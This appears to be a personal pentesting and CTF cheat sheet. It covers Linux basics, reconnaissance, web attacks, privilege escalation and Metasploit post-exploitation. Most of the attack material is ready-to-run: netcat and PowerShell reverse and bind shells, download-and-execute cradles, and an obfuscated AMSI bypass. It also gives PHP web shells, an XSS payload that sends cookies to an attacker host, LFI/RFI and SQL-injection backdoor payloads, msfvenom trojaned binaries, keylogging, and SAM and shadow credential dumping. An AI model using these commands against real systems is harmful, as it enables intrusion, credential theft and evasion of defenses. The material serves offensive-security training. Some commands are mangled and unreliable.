# notes-simple-ctf pentesting-guide
some notes i gathered online when doing ctf pentesting 

## 2. linux basic

    • /bin - basic programs (ls, cd, cat, etc.)
    • /sbin - system programs (fdisk, mkfs, sysctl, etc)
    • /etc - configuration files
    • /tmp - temporary files (typically deleted on boot)
    • /usr/bin - applications (apt, ncat, nmap, etc.)
    • /usr/share - application support and data files
    mkdir -p test/{recon,exploit,report} = create multiple subfolder in test folder

**#find files**

    which sbd => /usr/share/sbd
    whereis netcat.exe => /usr/bin/netcat /usr/share/man/man1/netcat.1.gz
    locate netcat.exe => /usr/share/windows-resources/netcat.exe
    find / type f -name netcat* => /usr/bin/netcat
		    			/usr/share/windows-resources/sbd/netcat.exe

**#manage linux service**

    sudo apt install ssh
    sudo service ssh start
    sudo systemctl start ssh - temp start
    sudo systemctl enable ssh - start at boot
    sudo apt remove --purge ssh - remove all files
    sudo dpkg -i app.deb
    sudo apt -f install

## 3. command line

    echo "haha" > hello.txt
    echo "haha new line w double redirection" >> hello.txt

**#text searching :**

    grep: re expression(string) => 
    sed: echo "I need to try hard" | sed 's/hard/harder/' => I need to try harder
    cut: cut -d ":" -f 1 /etc/passwd => 	root
    					daemon
    					bin
    					sys
    awk: echo "hello::there::friend" | awk -F "::" '{print $1, $3}' => hello friend

**#comparing files**

    comm
    diff
    vimdiff
    ctrl-z - run bg
    bg - shell process running background without interrupt
    fg - return process foreground

**#process control**

    ps -ef
    ps aux | grep tilix
    kill 1337
    ps -fC tilix

**#download/ transfer file**

    wget -O fakevil.exe http:github.com/evilfile/evil.exe
    curl -o fakevil.exe http:github.com/evilfile/evil.exe

## 4. practical tool

**#python3 simple server**

    python3 -m http.server 9000

**#remote desktop**

    kali: rdesktop victimIP -u username -p passwd -g 1024x768 -x 0x80

**#netcat => connect to ssh server** 

    kali: nc -nv 192.168.0.5 22

**#listen on tcp/udp**

    victim: nc -lvpn 4444
    kali: nc -nv 192.168.0.5 4444

**#nc transfer file to victim**

    victim: nc -lvpn 4444 > evil.exe
    kali: nc -nv 192.168.0.5 4444 < /root/Desktop/evil.exe

**#bind shell**

    victim: nc -nlvp 4444 -e cmd.exe
    kali: nc -nv 192.168.0.5 4444

**#rev shell**

    victim: nc -nlvp 4444
    kali: nc -nv 192.168.0.5 4444 -e /bin/bash

**#Powershell**

    PS victim: Set-ExecutionPolicy Unrestricted
    PS victim: Get-ExecutionPolicy -> appear "Unrestricted" on PS

**#PS file transfer**

    cmd victim: powershell -c "(new-object System.Net.WebClient).DownloadFile('http://192.168.0.7:80/usr/share/windows-resources/binaries/wget.exe','C:\Users\victim\Desktop\wget.exe')"
    cmd victim: wget.exe -V
    PS victim: IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.7/mini-reverse.ps1')
    PS victim: Invoke-WebRequest -Uri http://10.10.14.18:9000/nc.exe -OutFile nc2.exe

**#PS rev shell**

    cmd victim: powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.0.7',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
    $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T
    ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII
    ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c
    lient.Close()"
    kali: sudo nc -lnvp 443

**#PS bind shell**

    cmd victim: powershell -c "$listener = New-Object System.Net.Sockets.TcpListener(
    '0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $clie
    nt.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $byt
    es.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString
    ($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$str
    eam.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Sto
    p()"
    kali: nc -nv 192.168.0.5 443

**#Powercat**

    PS victim: . .\powercat.ps1
    PS victim: iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
    PS victim: powercat -h

**#PC file transfer**

    kali: sudo nc -lnvp 443 > receiving_powercat.ps1
    PS victim: powercat -c 192.168.0.7 -p 443 -i C:\Users\victim\powercat.ps1

**#PC rev shell**

    kali: sudo nc -lvp 443
    PS victim: powercat -c 192.168.0.7 -p 443 -e cmd.exe

**#PC bind shell**

    PS victim: powercat -l -p 443 -e cmd.exe
    kali: nc 192.168.0.5 443


**#Wireshark**

    net 192.168.0.1/24 => capture traffic on the 192.168.0.1/24 address range:
    tcp.port == 21 => filter tcp on port 21

**#TCPdump**

    kali: sudo tcpdump -r packet_capture.pcap
    kali: sudo tcpdump -n -r packet_capture.pcap | awk -F" " '{print $3}' | sort | uniq -c | head #filter traffic skip DNS,head to view first 10 lines
    sudo tcpdump -n src host 172.16.40.10 -r packet_capture.pcap

# 5. Bash scripting

    echo "hello guys" >> helo.sh
    chmod +x helo.sh
    user=$(whoami);echo $user

# 6. Passive Info Gathering

**#OSINT Framework - listing of osint tool**

    https://osintframework.com/

**#website recon - find email,location,socmed, phone no, staffname first_initial+last_name, address**

    kali: whois target.com/targetIP
    kali: whois target.com |egrep -w 'Name Server|Registrant Name|Admin Name|Tech Name'

**#google hacking - refer ghdb**

    site:megacorpone.com filetype:pdf intitle: "index of" "parent directory"

**#netcraft - look for subdomain,technology used such as firewall,IDS, server type**

    https://searchdns.netcraft.com :site contains : *.megacorpone.com
    https://sitereport.netcraft.com/?url=www.megacorpone.com

**#Maltego - look for email, phone, socmed, server etc**

**#OSINT**

    github, gitlab, stackoverflow, soundforge -> look for company,user repo, source code, current project, techno used
    https://github.com/megacorpone

**#shodan - use API**
https://danielmiessler.com/study/shodan/

    port: Search by specific port
    net: Search based on an IP/CIDR
    hostname: Locate devices by hostname
    os: Search by Operating System
    city: Locate devices by city
    country: Locate devices by country
    geo: Locate devices by coordinates
    org: Search by organization
    before/after: Timeframe delimiter
    hash: Search based on banner hash
    has_screenshot:true Filter search based on a screenshot being present
    title: Search based on text within the title

    Search Examples
     Apache city:“San Francisco” port:“8080” product:“Apache Tomcat/Coyote JSP engine”

**#Security Header scanner - analyze HTTP response headers and provide basic analysis target site’s security posture**
https://securityheaders.com/

**#theHarvaster - gathers emails, names, subdomains, IPs, and URLs**

    sudo theHarvester -d target.com -b google

**#Socialsearcher - search engine for social media sites**
https://www.social-searcher.com

**#linkedin2username - Generate username lists for companies on LinkedIn**
https://github.com/initstring/linkedin2username

## 7. Active Information Gathering

**#DNS Enumeration**

    host-h
    host target.com 

**#Forward Lookup Brute Force**

    more comprehensive wordlists - /usr/share/seclists
    kali: cat brutelist.txt
    www
    ftp
    mail
    owa
    proxy
    router
    kali: for ip in $(cat brutelist.txt); do host $ip.megacorpone.com; done

**#Reverse Lookup Brute Force**

    for ip in $(seq 50 100); do host 10.10.78.$ip; done | grep -v "not found"

**#DNS Zone Transfers**

    kali: dnsrecon -d target.com -t axfr
    kali: dnsenum zonetransfer.me

**#Port Scanning**

    sudo nmap -sS IP -> stealth
    nmap -sV -sT -A IP -> banner, sevice enumeration script
    nmap IP --script=smb-os-discovery -> discover smb OS
    nmap -v -sn 192.168.0.1-254 -oG ping-sweep.txt; grep Up ping-sweep.txt | cut -d " " -f 2 -> discover live machines
    nmap -p 80 192.168.0.1-254 -oG web-sweep.txt; grep open web-sweep.txt | cut -d" " -f2 -> only port 80 live machines
    sudo masscan -p80 10.0.0.0/8

**#SMB Enumeration**

    nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254
    nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
    nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.5
    sudo nbtscan -r 10.11.1.0/24

**#NFS Enumeration**

    nmap -v -p 111 10.11.1.1-254
    nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254 -> find services that may have registered with rpcbind
    nmap -p 111 --script nfs* 10.11.1.72

**#SMTP Enumeration**

    nc -nv 10.11.1.217 25

**#SNMP Enumeration**

    sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt

## 8. Vuln Scanning
    Nessus
    Nmap -> sudo nmap --script vuln 192.168.0.5

## 9. Wep App attack
	
**#Web Shell:**    https://www.acunetix.com/websitesecurity/introduction-web-shells/

	kali: ./weevely.py generate password123 agent.php   #weevly shell
	kali: ./weevely.py "http://targetsite/agent.php" password123
	
	<?php system($_GET['cmd']); ?>   #site/webshell.php?cmd=whoami
	
	Modifying headers:
	<?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>     #a bit stealthy lol
	Then intercept:
	GET /vulnsite/webshell.php HTTP/1.1
	Host: 10.10.10.168
	Accept-Language: cat /etc/passwd
	
**#wappalyzer technology used**

    burpSuite:
    inspect url parameter
    inspect page content
    inspect response headers
    inspect robots.txt & sitemap.xml
    locate admin consoles /manager/html and /phpmyadmin
    dirb:
    nikto -host=http://www.megacorpone.com 

**#login -> use default cred, guessing, bruteforce,** 

    burpsuite intruder - set_session parameter change every request

**#XSS -steal cookie/session, content injection**

    <iframe src=http://kaliIP/report height=”0” width=”0”></iframe> -> deliver an XSS payload in input form/text field
    kali: sudo nc -nvlp 80

    steal cookie
    kali: sudo nc -nvlp 80
    <script>new Image().src="http://kaliIP/cool.jpg?output="+document.cookie;</script> -> inject into text field, wait user login or visit site

**#LFI - [include $file;] <-- vulnerable code**

    /etc/passwd & c:\boot.ini
    menu.php?file=c:\windows\system32\drivers\etc\hosts

    LFI to log poisoning:
    kali: nc -nv remoteIP 80
    kali: <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
    web url: menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
    
    LFI to php data wrapper: -> inject PHP code via LFI vulnerabilities.
    url: menu.php?file=data:text/plain,hello world
    url: menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>

**#RFI**

    kali: echo "<?php echo shell_exec($_GET['cmd']); ?>" >> evil.txt
    kali: sudo systemctl restart apache2 / python -m SimpleHTTPServer 8989
    kali: sudo nc -nvlp 80
    web url: menu.php?file=http://attackerIP/evil.txt
    web url: menu.php?file=http://attackerIP/evil.txt&cmd=ipconfig

**#SQLi**
https://www.hackingarticles.in/manual-sql-injection-exploitation-step-step/

**#column number enum**

    debug.php?id=1 order by 1 -> use burp repeater to automate find error in response
    debug.php?id=1 union all select 1, 2, 3
    debug.php?id=1 union all select 1, 2, @@version -> Extracting Data from the Database
    debug.php?id=1 union all select 1, 2, user()
    debug.php?id=1 union all select 1, 2, table_name from information_schema.tables --> enum db tables and column through the information_schema.
    debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users' --> enum tables
    debug.php?id=1 union all select 1, username, password from users  --> enum user,passwd 

    SQLi to Code Execution: 
    debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts') -> read a file using the load_file function
    debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php' --> INTO OUTFILE function to malicious PHP in server’s web root. 
    visit url: victimIP/backdoor.php?cmd=ipconfig
    
    #Automate SQLi with sqlmap:
    sqlmap -u http://victimIP/debug.php?id=1 -p "id"
    sqlmap -u http://victimIP/debug.php?id=1 -p "id" --dbms=mysql --dump
    sqlmap -u http://victimIP/debug.php?id=1 -p "id" --dbms=mysql --os-shell


## 10. Linux PrivEsc
	Fundamentals of Linux Privilege Escalation:
	https://www.slideshare.net/nullthreat/fund-linux-priv-esc-wprotections
**LinPEAS**

	cd /tmp; curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
	./linpeas.sh -a/-s 	#option -a for CTF only, -s for stealth mode
**LinEnum**

	cd /tmp; wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash LinEnum.sh
	cd /tmp; wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O privescc.sh
	./LinEnum.sh -t -k password
	
## 11. Windows PrivEsc  

	https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
	
**PowerUp.ps1**	https://recipeforroot.com/advanced-powerup-ps1-usage/ #PowerSploit manual https://powersploit.readthedocs.io/en/latest/
	
	#PowerUp.ps1 in ctf mode
	ECHO %Temp%
	PS victim: IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"	#get from Github or 
	PS victim: powershell -ep bypass
	PS victim: sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
	PS victim: Import-Module PowerUp.ps1
	PS victim: . .\PowerUp.ps1
	PS victim: Invoke-AllChecks
	
	#PowerUp.ps1 without touching Disk (load module directly into memory)
	PS C:\> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1")
	cd /usr/share/windows-resources/powersploit/Privesc/ | python3 -m http.server 9000	#get from LAN
	PS victim: IEX(New-Object Net.WebClient).DownloadString(‘http://<kali_ip>:9000/PowerUp.ps1’)
	cmd victim: C:\> powershell –exec bypass
	PS C:\> Import-Module PowerUp.ps1
	PS C:\> . .\PowerUp.ps1
	PS C:\> Invoke-AllChecks


## 13. Metasploit

**msfvenom**

	msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.160 LPORT=443 -f exe -o https_rev.exe  #https rev
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.160 LPORT=4445 -f exe -o evil2.exe  #tcp rev
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.160 LPORT=4445 -f exe -e x86/shikata_ga_nai -i 9 -x ori_idm.exe -o evil_idm.exe  #payload injection into binary
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.160 LPORT=443 -f elf > revshell.elf  #linux revshell
	msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.160 LPORT=443 -f raw > rev_shell.php   #PHP revshell
	
	python3 -m http.server 9000
	
	PS victim: Invoke-WebRequest -Uri http://10.10.10.160:9000/evil2.exe -OutFile evil2.exe
	
	msf > use exploit/multi/handler
	msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
	payload => windows/meterpreter/reverse_tcp
	msf exploit(handler) > set lhost 10.10.10.160
	lhost => 10.10.10.160
	msf exploit(handler) > set lport 4445
	lport => 4445
	msf exploit(handler) > run

	[*] Started reverse handler on 10.10.10.160:4445
	[*] Starting the payload handler...

	cmd victim: evil2.exe
	PS victim: PS C:\windows\temp> . .\evil2.exe
	
**Post-exploitation**    https://sushant747.gitbooks.io/total-oscp-guide/getting_meterpreter_shell.html
	
*meterpreter shell:*

	ps; run migrate -p 1337
	use post/   #tab for completion
	background -l            #List background sessions
	background -i 1          #Connect back to a background session

	portfwd add -l <kali port> -p <victim port> -r <victim ip>	#portforward ##portforwarding
	portfwd add -l 3306 -p 3306 -r 10.10.10.180
	nc 127.0.0.1 3306	#can access this port on our machine locally
	
	getsystem			#try privesc thru meterpreter
	keysscan_start; keyscan_dump; keyscan_stop
	
*Privesc thru meterpreter post module:*

	Ctr-z
	Background session 1? [y/N]  y
	use exploit/windows/local/service_permissions
	post/windows/gather/credentials/gpp
	use post/windows/gather/credentials/vnc
	run post/windows/gather/credential_collector 
	run post/multi/recon/local_exploit_suggester
	run post/windows/gather/enum_shares
	run post/windows/gather/enum_snmp
	run post/windows/gather/enum_applications
	run post/windows/gather/enum_logged_on_users
	run post/windows/gather/checkvm
	sessions -l		#show sessions
	sessions -i 1		#connect to it again

*windows portforward #plink.exe:*

	cd /usr/share/windows-resources/binaries/ | python3 -m http.server 9000
	PS victim: Invoke-WebRequest -Uri http://10.10.10.160:9000/plink.exe -OutFile plink.exe	
	plink.exe -l <kali_user> -pw <kali_passwd> <kaliIP> <-R bind to lport>:127.0.0.1:<rport>
	plink.exe -l root -pw kalipasswd 192.168.0.101 -R 8080:127.0.0.1:8080
	
*Requires administrative rights [rooted]:*

	hashdump
	persistence
	wce32.exe -w		#WCE can steal NTLM passwords from memory in cleartext! 
	
	C:\> reg.exe save hklm\sam c:\windows\temp\sam.save
	C:\> reg.exe save hklm\security c:\windows\temp\security.save
	C:\> reg.exe save hklm\system c:\windows\temp\system.save
	# use secretdump.py after transfer 3 files above.
	kali: secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
	
*TCP dump via meterpreter:*

	run packetrecorder -li
	run packetrecorder -i 1
	
*TCP dump in kali and sniff via meterpreter:*

	kali: sudo tcpdump -i wlan0 src port 80 or dst port 80 -w port-80.pcap
	kali: sudo tcpdump -i wlan0 -vvv -A | grep "GET"	#grep all GET from the wlan0 interface
	kali: sudo tcpdump -nX -r port-80.pcap			#Print the traffic in hex with ascii interpretation.
	kali: sudo tcpdump tcp -w tcp-traffic.pcap 		#Only record tcp-traffic
	kali meterpreter: use auxiliary/sniffer/psnuffle			#sniff passwords and usernames from pop3, imap, ftp, and HTTP GET

*search files:*
	
	search -f config*
	search -f *.sql
	dir /s 	#recursive search
	.ssh:
	.bash_history
	
*sudo crack etc/shadow file:*

	sudo cp /etc/passwd /etc/shadow to kali
	sudo unshadow passwd shadow > hashroot.txt
	john --rules --wordlist=/usr/share/wordlists/rockyou.txt > hashroot.txt

## 14. Persistence - Rootkit - Backdoor
https://sushant747.gitbooks.io/total-oscp-guide/persistence.html
	
## 15. Cover Tracks
https://sushant747.gitbooks.io/total-oscp-guide/clean_up.html
http://www.dankalia.com/tutor/01005/0100501003.htm

## 16. Pivoting, Port forwarding and tunneling
https://sushant747.gitbooks.io/total-oscp-guide/port_forwarding_and_tunneling.html
